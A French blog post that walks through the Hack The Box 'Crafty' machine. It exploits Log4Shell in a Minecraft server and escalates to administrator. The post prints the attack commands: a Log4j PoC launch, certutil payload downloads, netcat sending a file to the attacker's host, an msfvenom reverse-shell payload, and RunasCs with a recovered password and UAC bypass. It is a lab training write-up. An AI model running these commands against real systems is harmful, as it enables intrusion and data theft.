<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Crafty</title>
<meta name=description content="Platforme: Hack The Box Lien: Crafty Niveau: Facile OS: Windows Lire cet article en anglais
Crafty est un Windows Server 2019 avec Minecraft 1.16.5, cette …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-crafty/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Crafty"><meta property="og:description" content="Platforme: Hack The Box Lien: Crafty Niveau: Facile OS: Windows Lire cet article en anglais
Crafty est un Windows Server 2019 avec Minecraft 1.16.5, cette …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Crafty/Crafty.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Crafty/Crafty.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Crafty"><meta name=twitter:description content="Platforme: Hack The Box Lien: Crafty Niveau: Facile OS: Windows Lire cet article en anglais
Crafty est un Windows Server 2019 avec Minecraft 1.16.5, cette …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-crafty/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-crafty/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Crafty/Crafty.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-crafty/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-crafty/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Crafty</h1><small role=doc-subtitle></small><p class=post-date>5 min read |
<span class=post-date>12 Juin 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Crafty>Crafty</a></li><li>Niveau: Facile</li><li>OS: Windows</li></ul><hr><p><a href=https://scorpiosec.com/posts/htb-crafty/>Lire cet article en anglais</a></p><p>Crafty est un Windows Server 2019 avec Minecraft 1.16.5, cette version est vulnérable à Log4Shell (<code>CVE-2021-44228</code>). Sur Github, nous avons accès à une preuve de concept pour exploiter cette vulnérabilité, nous l&rsquo;utilisons pour obtenir un accès initial au système cible. Pour élever nos privilèges, nous utilisons un mot de passe trouvé dans une archive Java afin d&rsquo;accéder au compte administrateur.</p><p>Addresse IP cible - <code>10.10.11.249</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>sudo nmap -sC -sV -p- -oA nmap/Crafty 10.10.11.249
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-02-26 13:56 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> crafty.htb <span style=color:#56b6c2>(</span>10.10.11.249<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.054s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>65533</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE   VERSION
</span></span><span style=display:flex><span>80/tcp    open  http      Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>|_http-title: Crafty - Official Website
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>25565/tcp open  minecraft Minecraft 1.16.5 <span style=color:#56b6c2>(</span>Protocol: 127, Message: Crafty Server, Users: 0/100<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 171.62 seconds
</span></span></code></pre></div><p>Notre scan révèle deux ports ouverts:</p><ul><li>80 avec HTTP</li><li>25565, un serveur minecraft version 1.16.5</li></ul><p>Bien qu&rsquo;il n&rsquo;y ait pas de redirection, ajoutons <code>crafty.htb</code> à notre fichier hosts pour faciliter l&rsquo;énumération.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.249 crafty.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>Lorsque nous nous rendons sur le site web, nous trouvons une page web pour un jeu appelé Crafty.</p><p><img src=/images/HTB-Crafty/crafty-webpage.png alt="Crafty website"></p><p>Nous n&rsquo;avons aucun moyen d&rsquo;interagir avec l&rsquo;application web, nous tournons donc notre attention vers le serveur Minecraft. En recherchant <code>minecraft 1.16.5 vulnerability</code>, nous découvrons Log4j avec le <a href=https://nvd.nist.gov/vuln/detail/CVE-2021-44228>CVE-2021-44228</a>.</p><blockquote><p><code>play.crafty.htb</code> nous redirige vers <code>crafty.htb</code>.</p></blockquote><p><img src=/images/HTB-Crafty/log4j-Minecraft.png alt="Minecraft Log4j exploit"></p><p>Nous trouvons ensuite une preuve de concept sur ce <a href="https://github.com/kozmer/log4j-shell-poc?source=post_page-----316a735a306d--------------------------------">repo Github</a>.</p><p>Après inspection du contenu de <code>poc.py</code>, nous remarquons qu&rsquo;il utilise <code>String cmd="/bin/sh";</code> ce qui ne fonctionnera pas sous Windows. Afin de le rendre compatible avec Windows, nous changeons cette ligne en <code>String cmd="cmd.exe";</code>.</p><p><img src=/images/HTB-Crafty/log4j-poc-content.png alt="Log4j PoC content"></p><p><img src=/images/HTB-Crafty/poc-python-change.png alt="Log4j PoC content change"></p><p>Sur la page Github, nous lisons: &ldquo;<strong>Note:</strong> For this to work, the extracted java archive has to be named: <code>jdk1.8.0_20</code>, and be in the same directory.&rdquo;</p><p>En allant sur le site web indiqué sur la page Github, il nous est demandé de créer un compte. Après quelques recherches, nous trouvons des archives java sur <a href=https://repo.huaweicloud.com/java/>https://repo.huaweicloud.com/java/</a>.</p><pre tabindex=0><code>#Veillez à télécharger l&#39;archive dans le dossier log4j-shell-poc.
wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz

tar -xf jdk-8u181-linux-x64.tar.gz

#Renommez le fichier
mv jdk1.8.0_181 jdk1.8.0_20
</code></pre><h2 id=accès-initial>Accès initial</h2><p><img src=/images/HTB-Crafty/log4j-poc-files.png alt="Log4j PoC files"></p><p>Nous avons besoin d&rsquo;un moyen de communiquer avec le serveur Minecraft, nous utiliserons <a href=https://github.com/ammaraskar/pyCraft>pyCraft</a>. Configurons un environnement virtuel pour pyCraft.</p><pre tabindex=0><code>virtualenv ENV

source ENV/bin/activate

pip install -r requirements.txt
</code></pre><p><img src=/images/HTB-Crafty/pyCraft-setup.png alt="PyCraft setup"></p><p>Nous avons également besoin d&rsquo;un listener netcat</p><pre tabindex=0><code>rlwrap nc -lvnp 4444
</code></pre><p>Ensuite, nous lançons l&rsquo;exploit log4j à partir du répertoire <code>log4j-shell-poc</code>.</p><pre tabindex=0><code>python3 poc.py --userip &lt;IP_ADDRESS&gt; --webport 80 --lport &lt;PORT_NUMBER&gt;
</code></pre><p><img src=/images/HTB-Crafty/crafty-exploit.png alt="Log4j exploit launch"></p><p>Depuis le dossier <code>PyCraft</code> nous exécutons <code>start.py</code></p><pre tabindex=0><code>python3 start.py
</code></pre><p>Après s&rsquo;être connecté au serveur, nous copions le lien généré par <code>log4j-shell-poc</code> (sur la ligne commençant par <code>[+] Send me:</code>), nous le collons dans pyCraft puis nous appuyons sur <code>Enter</code> pour obtenir une connexion sur le listener.</p><p><img src=/images/HTB-Crafty/PyCraft-connection-link.png alt=PyCraft></p><blockquote><p>Si PyCraft ne parvient pas à se connecter au serveur, réinitialiser la box sur HackTheBox devrait résoudre le problème.</p></blockquote><p><img src=/images/HTB-Crafty/shell-minecraft.png alt="svc_minecraft shell"></p><p>Nous trouvons <code>user.txt</code> sur le bureau de l&rsquo;utilisateur.</p><p><img src=/images/HTB-Crafty/crafty-user-flag.png alt="Crafty user flag"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Une archive nommée <code>playercounter-1.0-SNAPSHOT.jar</code> est trouvée dans <code>c:\Users\svc_minecraft\server\plugins\</code>.</p><p>Pour exfiltrer le fichier vers notre machine locale, nous utilisons <code>nc.exe</code> (Netcat pour Windows).</p><ol><li>Téléchargez <code>nc.exe</code> avec</li></ol><pre tabindex=0><code>wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
</code></pre><ol start=2><li>Démarrez un serveur web avec Python dans le répertoire <code>netcat-1.11</code>.</li></ol><pre tabindex=0><code>python3 -m http.server
</code></pre><ol start=3><li>Envoyez <code>nc.exe</code> sur le système cible</li></ol><pre tabindex=0><code>certutil.exe -urlcache -split -f http://IP:PORT/nc.exe nc.exe
</code></pre><p><img src=/images/HTB-Crafty/nc.exe-ontarget.png alt="netcat upload on target"></p><ol start=4><li>Sur notre machine locale, nous exécutons</li></ol><pre tabindex=0><code>nc -nlp 1235 &gt; playercounter-1.0-SNAPSHOT.jar
</code></pre><ol start=5><li>Enfin, nous envoyons l&rsquo;archive à notre machine Kali</li></ol><pre tabindex=0><code>.\nc.exe 10.10.14.222 1235 &lt; c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
</code></pre><p><img src=/images/HTB-Crafty/archive-exfiltration.png alt="Crafty archive exfiltration"></p><blockquote><p>Pour reprendre le contrôle du terminal sur le système cible, arrêtez le listener</p></blockquote><p>Après avoir extrait l&rsquo;archive, nous obtenons <code>Playercounter.class</code> dans <code>/htb/crafty/playercounter/</code> que nous décompilons avec <a href=https://www.decompiler.com/>decompiler.com</a>.</p><blockquote><p>Pour en savoir plus sur les fichiers .class, cliquez <a href=https://www.online-convert.com/fr/format-fichier/class>ici</a></p></blockquote><p>Nous trouvons ce qui ressemble à un mot de passe (<code>s67u84zKq8IXw</code>) utilisé lors de la connexion à un service sur le port 27015 (typiquement utilisé par les jeux en ligne).</p><p><img src=/images/HTB-Crafty/playercount-file.png alt="archive content credentials"></p><p>Nous disposons d&rsquo;un outil appelé <a href=https://github.com/antonioCoco/RunasCs>RunasCs</a> qui nous permet d&rsquo;exécuter des processus avec des permissions différentes de celles de notre utilisateur actuel. Notre objectif est d&rsquo;obtenir l&rsquo;accès au compte <code>Administrator</code> à partir de l&rsquo;utilisateur actuel <code>svc_minecraft</code>.</p><p>Créons un payload avec <code>msfvenom</code>.</p><p><strong>Example</strong></p><pre tabindex=0><code>msfvenom -p windows/x64/shell_reverse_tcp lhost=&lt;YOUR IP ADDRESS&gt; lport=&lt;PORT NUMBER&gt; -f exe -a x64 --platform windows -o shell.exe
</code></pre><p>Les fichiers <code>shell.exe</code> et <code>RunasCs.exe</code> sont transférés à la cible en utilisant la même méthode que celle employée pour <code>nc.exe</code>.</p><p><img src=/images/HTB-Crafty/files-on-target.png alt="malicious file and runascs.exe on target"></p><p>Nous mettons en place un autre listener sur le port sélectionné pour le payload.</p><pre tabindex=0><code>rlwrap -cAr nc -lvp &lt;PORT_NUMBER&gt;
</code></pre><p>Nous utilisons ensuite <code>runasCs</code> en conjonction avec le fichier malveillant.</p><pre tabindex=0><code>.\runasCs.exe administrator s67u84zKq8IXw shell.exe --bypass-uac
</code></pre><p>Et finalement nous obtenons une connexion sur le listener, en tant que <code>administrator</code>.</p><p><img src=/images/HTB-Crafty/admin-shell.png alt="admin shell"></p><p>Dans <code>C:\Users\Administrator\Desktop</code> nous trouvons <code>root.txt</code>.</p><p><img src=/images/HTB-Crafty/root-flag.png alt="root flag"></p><h2 id=mots-de-fin>Mots de Fin</h2><p>Log4j est considéré comme l&rsquo;une des vulnérabilités les plus critiques, car elle permet aux attaquants de facilement prendre le contrôle de systèmes vulnérables. Il est très important d&rsquo;être capable de reconnaître et de tester les vulnérabilités les plus populaires. Vous trouverez ci-dessous une vidéo et un article détaillant Log4j.</p><ul><li><a href="https://www.youtube.com/watch?v=U6V5ok-O4ec&amp;ab_channel=Techno">Log4J | Log4shell : c&rsquo;est quoi cette vulnérabilité en deux mots ? | Vulnérabilité Log4J</a></li><li><a href=https://www.trendmicro.com/fr_fr/what-is/apache-log4j-vulnerability.html>Qu’est-ce que la vulnérabilité Apache Log4J (Log4Shell) ?</a></li></ul></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-bizness/>&#8592;
Précédent:
HTB: Bizness</a></p><p class=prev-post-date>mai 22, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-headless/>Suivant:
HTB: Headless
&#8594;</a></p><p class=next-post-date>juillet 19, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès initial</a></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li><li><a href=#mots-de-fin>Mots de Fin</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>